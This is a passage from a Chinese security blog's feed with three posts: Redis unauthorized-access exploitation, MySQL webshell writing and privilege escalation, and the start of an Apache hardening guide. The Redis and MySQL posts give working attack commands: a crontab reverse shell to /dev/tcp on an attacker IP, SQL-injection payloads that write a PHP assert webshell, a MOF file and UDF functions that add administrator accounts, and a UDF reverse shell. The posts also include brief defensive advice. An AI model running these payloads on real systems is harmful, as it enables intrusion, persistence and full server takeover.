class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1)"dbfilename"</span><br><span class="line">2)"authorized_keys"</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; EXIT</span><br></pre></td></tr></table></figure><p>然后我们退出连接后再在攻击机里面用SSH来连接到靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.3.74</span><br></pre></td></tr></table></figure><h2 id="Redis利用crontab反弹shell"><a href="#Redis利用crontab反弹shell" class="headerlink" title="Redis利用crontab反弹shell"></a>Redis利用crontab反弹shell</h2><p>这个就不进行实验了，贴一下代码。首先在攻击机上开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>然后连接到Redis后并写入反弹shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.74</span><br><span class="line">set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.3.66/4444 0&gt;&amp;1\n</span><br></pre></td></tr></table></figure><p>然后执行下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>最后在攻击机上就能收到一个shell。</p><blockquote><p>这里介绍一下crontab –  使用定时任务来反弹shell：</p><ul><li>系统任务调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/crontab</span><br></pre></td></tr></table></figure><ul><li>用户 XXX 调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine 下路径</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line"></span><br><span class="line">debian 下的路径（xxx 可以是任意东西）</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或者</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line">但是写这个路径的时候，文件内不能加用户名。</span><br></pre></td></tr></table></figure></blockquote><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ul><li><p>采用绑定IP的方式来进行控制</p><p>请在redis.conf文件找到如下配置</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="comment"># If you want you can bind a single interface, if the bind option is not``# specified all the interfaces will listen for incoming connections.``#``# bind 127.0.0.1`</span></span><br></pre></td></tr></table></figure><p>把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p><ul><li>设置密码，以提供远程登陆</li></ul><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`requirepass yourpassword``yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。`` ` `命令如下:``redis-cli -h yourIp -p yourPort``//启动redis客户端，并连接服务器``keys * ``//输出服务器中的所有key``报错如下``(error) ERR operation not permitted`` ` `这时候你可以用授权命令进行授权，就不报错了`` ` `命令如下:``auth youpassword`</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>渗透中可以多扫描一下6379的Redis端口，是个很好利用的点。然后要学会Redis的正确配置，防止被人攻下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a> </li><li><a href="https://nightmorning.site/wordpress/?p=755" target="_blank" rel="noopener">https://nightmorning.site/wordpress/?p=755</a> </li><li><a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis未授权访问&quot;&gt;&lt;a href=&quot;#Redis未授权访问&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问&quot;&gt;&lt;/a&gt;Redis未授权访问&lt;/h1&gt;&lt;p&gt;很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍R
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MYSQL提权</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/</id>
    <published>2020-03-02T07:58:51.000Z</published>
    <updated>2020-03-04T02:54:54.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL写Webshell"><a href="#MYSQL写Webshell" class="headerlink" title="MYSQL写Webshell"></a>MYSQL写Webshell</h1><p>写Webshell比较常见的方法有：</p><ul><li>select … into outfile</li><li>general_log</li></ul><hr><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>没有配置 <code>–secure-file-priv</code></li></ul><h3 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><ul><li>有 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile ‘/home/wwwroot/shadowyspirits/evil.php’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>无 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/shadowyspirits/evil.php’ fields terminated by ‘&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>其中 <code>fields terminated by</code> 是用来指定列之间分隔符，如果查询结果为单列则不会插入分隔符，所以必须有多个列才能成功写入一句话。</p><hr><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>需要能执行多行sql语句</li></ul><h3 id="2-利用方式-1"><a href="#2-利用方式-1" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'/home/wwwroot/shadowyspirits/evil.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p>设置了 <code>general_log</code> 和 <code>general_log_file</code> 之后所有SQL记录都会写入指定的文件，所以会导致 log 文件非常大，推荐只暂时打开</p><p>需要注意的是 <code>secure_file_priv</code> 是只读属性，如果试图使用 <code>set global</code> 修改会报如下 Error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error Code: 1238. Variable &apos;secure_file_priv&apos; is a read only</span><br></pre></td></tr></table></figure><h2 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h2><ul><li>设置 <code>secure_file_prive = null</code> （不允许导入和导出）</li><li>防止暴露网站绝对路径</li><li>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload </li><li>目录不授予执行权限</li></ul><hr><h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权一般有三种方法：</p><ul><li>mof提权</li><li>udf提权</li><li>反弹shell</li></ul><hr><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了<code>secure-file-priv</code></li></ul><h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>下面是一段写好了的mof利用代码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace("\\\\.\\root\\subscription") </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = "Root\\Cimv2"; </span><br><span class="line">Name  = "filtP2"; </span><br><span class="line">    Query = "Select \ From __InstanceModificationEvent "  </span><br><span class="line">            "Where TargetInstance Isa \"Win32_LocalTime\" " </span><br><span class="line">            "And TargetInstance.Second = <span class="number">5</span>"; </span><br><span class="line">QueryLanguage = "WQL"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = "consPCSV2"; </span><br><span class="line">ScriptingEngine = "JScript"; </span><br><span class="line">ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"<span class="built_in">net</span>.exe user admin admin /add")"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer;  </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:/windows/system32/wbem/mof/就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><p>执行完后，你可以在你的webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了。</p><hr><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</li><li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于c:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><blockquote><p>注：关于plugin目录，可在mysql中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure><p>进行查看，这个目录也就是dll文件需要导入的目录</p></blockquote><h3 id="3-利用方式-1"><a href="#3-利用方式-1" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><ul><li>将dll文件导入到相应目录，如果导入错误会产生<code>cant open shared library</code>错误</li><li>创建自定义函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure><blockquote><p>注意这里的函数名应该与dll文件中的函数名一致。</p></blockquote><p>当然关于udf有一个特别需要注意的问题，就是5.1以上版本默认情况下<code>/lib/plugin</code>目录是不存在的，还好有大牛已经想出了解决办法——<code>NTFS ADS流</code>来创建文件夹（该方法我们测试过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><blockquote><p>注：udf提权也是一般应用于win2000、win2003系统</p></blockquote><hr><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面<code>udf.dll</code>文件的内容先插入到数据表中，然后再导出到<code>/lib/plugin</code>目录。</p><blockquote><p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p></blockquote><ul><li>创建函数backshell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure><ul><li>在具备独立主机的服务器上执行监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure><ul><li>执行backshell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure><p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MYSQL写Webshell&quot;&gt;&lt;a href=&quot;#MYSQL写Webshell&quot; class=&quot;headerlink&quot; title=&quot;MYSQL写Webshell&quot;&gt;&lt;/a&gt;MYSQL写Webshell&lt;/h1&gt;&lt;p&gt;写Webshell比较常见的方法有：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-02T03:00:59.000Z</published>
    <updated>2020-03-18T08:22:51.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全配置"><a href="#Apache安全配置" class="headerlink" title="Apache安全配置"></a>Apache安全配置</h1><p>转载自 <a href="https://www.jianshu.com/p/a8bab3f50c7b" target="_blank" rel="noopener">https://www.jianshu.com/p/a8bab3f50c7b</a> </p><p>隐藏报错信息 -&gt; 隐藏目录列举 -&gt; 配置上传文件权限 -&gt; 配置Apache运行权限 -&gt; 处理Apache日志</p><h2 id="0x00-安全配置思维导图"><a href="#0x00-安全配置思维导图" class="headerlink" title="0x00 安全配置思维导图"></a>0x00 安全配置思维导图</h2><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/1.png" alt></p><h2 id="0x01-错误详情页banner隐藏"><a href="#0x01-错误详情页banner隐藏" class="headerlink" title="0x01 错误详情页banner隐藏"></a>0x01 错误详情页banner隐藏</h2><h3 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h3><p>黑客在渗透的过程中，收集服务器的信息是至关重要的，这对于他在后期漏洞的利用上有很大的帮助。 </p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/2.png" alt></p><p>查看响应头信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:47:46 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)         <span class="comment">#中间件版本及操作系统</span></span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.22   <span class="comment"># 显示服务端脚本语言及版本号</span></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h3 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件：<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>隐藏中间件信息。修改或者添加以下配置，<strong>隐藏中间件版本和os</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ServerTokens</span> Prod</span><br><span class="line"><span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>2）修改配置文件：<code>/etc/php5/apache2/php.ini</code>第367行隐藏PHP信息，将expose_php = On修改为Off，<strong>隐藏服务端脚本语言和版本</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">expose_php</span> =  <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>3）保存退出之后，重启apache服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># service apache2 restart</span></span><br><span class="line">Restarting web server apache2                                         [ OK ]</span><br></pre></td></tr></table></figure><p>4）再次访问不存在的页面，已经没有banner信息了。</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/3.jpg" alt>查看响应头信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:51:41 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h2 id="0x02-列目录问题"><a href="#0x02-列目录问题" class="headerlink" title="0x02 列目录问题"></a>0x02 列目录问题</h2><h3 id="危害：-1"><a href="#危害：-1" class="headerlink" title="危害："></a>危害：</h3><p>当Web服务器配置不当的时候，如果当前目录不存在默认文件（比如index.html），Apache会列出当前目录下所有文件，造成敏感信息泄露。如下图所示：</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/6.png" alt></p><h3 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p><code>Options Indexes FollowSymLinks</code></p><blockquote><p>这里的indexes 是指在目录中要存在index文件，如果不存在把文件列出来，如果存在index文件可以直接显</p><p>index文件，因此每个目录都必须存在index文件，如果不存在有可能此目录把文件全部列出来。</p></blockquote><p>2）删除Indexes这个参数，然后重启apache服务。<code>service apache2 restart</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>3）再次访问就出现403 Forbidden页面</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/4.png" alt></p><h2 id="0x03-文件权限问题"><a href="#0x03-文件权限问题" class="headerlink" title="0x03 文件权限问题"></a>0x03 文件权限问题</h2><h3 id="危害：-2"><a href="#危害：-2" class="headerlink" title="危害："></a>危害：</h3><p>现在大部分站点都存在文件上传，比如说头像上传，附件上传等等。如果在代码层对上传的文件限制的不够严格，很容易被上传Webshell。一旦被上传Webshell对服务器造成十分大的威胁。</p><h3 id="修复方法：-2"><a href="#修复方法：-2" class="headerlink" title="修复方法："></a>修复方法：</h3><p>如果我们对存放上传文件的目录限制脚本执行的权限的话，上传的脚本文件就无法执行，在一定程度上能够减轻黑客攻击造成的危害，并且还不影响正常的业务，上穿的图片不需要执行权限，也能正常打开。</p><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html/zk/&gt;</span> <span class="comment">#这里文件夹设置想要限制的 </span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>2）此时上传的小马已经无法执行</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/5.png" alt></p><h2 id="0x04-服务器运行权限问题"><a href="#0x04-服务器运行权限问题" class="headerlink" title="0x04 服务器运行权限问题"></a>0x04 服务器运行权限问题</h2><p>1）查看Apache的进程：lsof -i:80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># lsof -i:80</span></span><br><span class="line">COMMAND   PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">apache2 11302     root    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11304 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11305 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11306 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11307 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11308 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 13248 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 14885 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure><p>2）或者ps aux|grep apache|grep -v grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ps -aux | grep apache |grep -v grep</span></span><br><span class="line">root      11302  0.0  0.2  71104  2340 ?        Ss   Dec04   0:03 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11304  0.0  0.2  71176  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11305  0.0  0.2  71176  2256 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11306  0.0  0.2  71200  2284 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11307  0.0  0.2  71184  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11308  0.0  0.2  71176  2276 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  13248  0.0  0.2  71176  2352 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  14885  0.0  0.2  71176  2368 ?        S    Dec04   0:00 /usr/sbin/apache2 -k 